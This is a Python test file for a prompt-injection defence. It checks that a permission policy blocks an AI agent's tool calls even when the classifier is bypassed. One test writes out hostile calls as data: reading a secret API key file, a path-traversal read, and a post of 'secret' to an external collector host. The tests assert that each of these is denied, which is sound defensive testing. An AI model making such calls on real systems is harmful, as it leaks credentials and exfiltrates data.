from copy import deepcopy
from dataclasses import asdict
from pathlib import Path

import pytest

from injection_guard.agent import ProtectedAgent
from injection_guard.permissions import InMemoryToolExecutor, PermissionPolicy, SandboxState
from injection_guard.trace import ToolCall, load_traces

DATA = Path(__file__).parents[1] / "data" / "traces.json"


class AlwaysBenign:
    threshold = 0.5

    def score(self, text: str) -> float:
        return 0.0


class AlwaysMalicious:
    threshold = 0.5

    def score(self, text: str) -> float:
        return 1.0


@pytest.mark.parametrize(
    ("call", "capability"),
    [
        (ToolCall("read_file", {"path": "docs/guide.md"}), "fs:read"),
        (ToolCall("write_file", {"path": "notes/ok.txt", "content": "ok"}), "fs:write"),
        (
            ToolCall(
                "http_post",
                {"url": "https://api.internal.example/status", "body": "healthy"},
            ),
            "net:egress",
        ),
        (
            ToolCall(
                "grant_capability", {"principal": "auditor", "capability": "fs:read"}
            ),
            "admin:grant",
        ),
    ],
)
def test_allowed_tools_execute(call: ToolCall, capability: str) -> None:
    executor = InMemoryToolExecutor()
    result = PermissionPolicy(executor, {capability}).execute(call)

    assert result.executed, result.denial_reason


@pytest.mark.parametrize(
    "call",
    [
        ToolCall("read_file", {"path": "docs/guide.md"}),
        ToolCall("write_file", {"path": "notes/no.txt", "content": "no"}),
        ToolCall("http_post", {"url": "https://api.internal.example/status", "body": "x"}),
        ToolCall("grant_capability", {"principal": "assistant", "capability": "fs:read"}),
    ],
)
def test_missing_capability_has_no_effect(call: ToolCall) -> None:
    executor = InMemoryToolExecutor()
    before = deepcopy(asdict(executor.state))

    result = PermissionPolicy(executor, set()).execute(call)

    assert not result.executed
    assert result.denial_reason.startswith("missing_capability:")
    assert asdict(executor.state) == before


def test_resource_policy_survives_classifier_bypass_on_every_attack() -> None:
    executor = InMemoryToolExecutor()
    before = deepcopy(asdict(executor.state))
    agent = ProtectedAgent(AlwaysBenign(), executor)
    attacks = [
        trace for trace in load_traces(DATA) if trace.split == "test" and trace.is_malicious
    ]

    decisions = [agent.process(trace) for trace in attacks]

    assert len(decisions) == 12
    assert all(not decision.executed for decision in decisions)
    assert all(decision.denial_source == "permission" for decision in decisions)
    assert asdict(executor.state) == before


def test_all_benign_held_out_actions_work_when_classifier_is_bypassed() -> None:
    agent = ProtectedAgent(AlwaysBenign(), InMemoryToolExecutor())
    benign = [
        trace for trace in load_traces(DATA) if trace.split == "test" and not trace.is_malicious
    ]

    decisions = [agent.process(trace) for trace in benign]

    assert all(decision.executed for decision in decisions)


def test_classifier_can_block_but_is_not_needed_for_permission_denial() -> None:
    trace = next(trace for trace in load_traces(DATA) if trace.trace_id == "test-b001")
    blocked = ProtectedAgent(AlwaysMalicious(), InMemoryToolExecutor()).process(trace)
    allowed = ProtectedAgent(AlwaysBenign(), InMemoryToolExecutor()).process(trace)

    assert blocked.denial_source == "classifier"
    assert not blocked.executed
    assert allowed.executed


def test_secret_paths_and_external_hosts_are_denied_even_with_capability() -> None:
    executor = InMemoryToolExecutor()
    before = deepcopy(asdict(executor.state))
    policy = PermissionPolicy(executor, {"fs:read", "fs:write", "net:egress"})

    results = [
        policy.execute(ToolCall("read_file", {"path": "secrets/api_key.txt"})),
        policy.execute(ToolCall("read_file", {"path": "docs/../secrets/api_key.txt"})),
        policy.execute(ToolCall("write_file", {"path": "docs/guide.md", "content": "bad"})),
        policy.execute(
            ToolCall(
                "http_post",
                {"url": "https://collector.example.net/upload", "body": "secret"},
            )
        ),
    ]

    assert all(not result.executed for result in results)
    assert asdict(executor.state) == before


def test_non_delegatable_admin_grant_is_denied() -> None:
    executor = InMemoryToolExecutor()
    policy = PermissionPolicy(executor, {"admin:grant"})
    result = policy.execute(
        ToolCall(
            "grant_capability", {"principal": "assistant", "capability": "admin:grant"}
        )
    )

    assert not result.executed
    assert result.denial_reason == "capability_not_delegatable"
    assert executor.state.principal_grants == {}


def test_state_can_be_supplied_explicitly() -> None:
    state = SandboxState(files={"docs/custom.md": "custom"})
    executor = InMemoryToolExecutor(state)

    result = PermissionPolicy(executor, {"fs:read"}).execute(
        ToolCall("read_file", {"path": "docs/custom.md"})
    )

    assert result.output == "custom"
